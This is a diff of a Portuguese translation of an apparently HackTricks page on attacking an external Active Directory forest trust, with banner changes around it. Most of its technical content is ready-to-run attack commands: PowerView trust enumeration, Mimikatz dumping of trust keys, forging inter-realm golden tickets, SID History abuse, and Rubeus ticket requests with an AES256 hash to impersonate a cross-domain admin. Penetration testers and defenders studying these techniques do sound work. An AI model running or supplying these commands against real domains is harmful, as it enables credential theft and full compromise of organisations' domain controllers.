@@ -1,22 +1,25 @@
-# Domínio Florestal Externo - Unidirecional (Entrada) ou bidirecional
+# Domínio de Floresta Externa - OneWay (Inbound) ou bidirecional
+
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
+{% endhint %}
 
 Neste cenário, um domínio externo está confiando em você (ou ambos estão confiando um no outro), então você pode obter algum tipo de acesso sobre ele.
 
 ## Enumeração
 
-Em primeiro lugar, você precisa **enumerar** a **confiança**:
+Primeiro de tudo, você precisa **enumerar** a **confiança**:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -66,29 +69,33 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-Durante a enumeração anterior, foi descoberto que o usuário **`crossuser`** está dentro do grupo **`External Admins`** que possui **acesso de administrador** dentro do **DC do domínio externo**.
+Na enumeração anterior, foi descoberto que o usuário **`crossuser`** está dentro do grupo **`External Admins`** que tem **acesso de Admin** dentro do **DC do domínio externo**.
 
 ## Acesso Inicial
 
-Se você **não conseguiu** encontrar nenhum **acesso especial** do seu usuário no outro domínio, ainda é possível voltar para a Metodologia do AD e tentar **elevar privilégios a partir de um usuário não privilegiado** (coisas como kerberoasting, por exemplo):
+Se você **não conseguiu** encontrar nenhum acesso **especial** do seu usuário no outro domínio, você ainda pode voltar à Metodologia AD e tentar **privesc de um usuário não privilegiado** (coisas como kerberoasting, por exemplo):
 
-Você pode usar as funções do **Powerview** para **enumerar** o **outro domínio** usando o parâmetro `-Domain` como em:
+Você pode usar as **funções do Powerview** para **enumerar** o **outro domínio** usando o parâmetro `-Domain` como em:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
+{% content-ref url="./" %}
+[.](./)
+{% endcontent-ref %}
+
 ## Impersonação
 
 ### Login
 
-Usando um método regular com as credenciais do usuário que tem acesso ao domínio externo, você deve ser capaz de acessar:
+Usando um método regular com as credenciais dos usuários que têm acesso ao domínio externo, você deve ser capaz de acessar:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### Abuso do SID History
 
-Também é possível abusar do [**SID History**](sid-history-injection.md) através de uma confiança entre florestas.
+Você também pode abusar do [**SID History**](sid-history-injection.md) através de uma confiança de floresta.
 
-Se um usuário é migrado **de uma floresta para outra** e **o Filtro SID não está habilitado**, torna-se possível **adicionar um SID da outra floresta**, e este **SID** será **adicionado** ao **token do usuário** ao autenticar **através da confiança**.
+Se um usuário for migrado **de uma floresta para outra** e **o SID Filtering não estiver habilitado**, torna-se possível **adicionar um SID da outra floresta**, e esse **SID** será **adicionado** ao **token do usuário** ao autenticar **através da confiança**.
 
 {% hint style="warning" %}
 Como lembrete, você pode obter a chave de assinatura com
@@ -97,7 +104,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-Você poderia **assinar com** a chave **confiável** um **TGT se passando** pelo usuário do domínio atual.
+Você poderia **assinar com** a chave **confiável** um **TGT de personificação** do usuário do domínio atual.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -108,7 +115,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Caminho completo para se passar pelo usuário
+### Impersonação completa do usuário
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -122,14 +129,17 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Suporte ao HackTricks</summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
+{% endhint %}
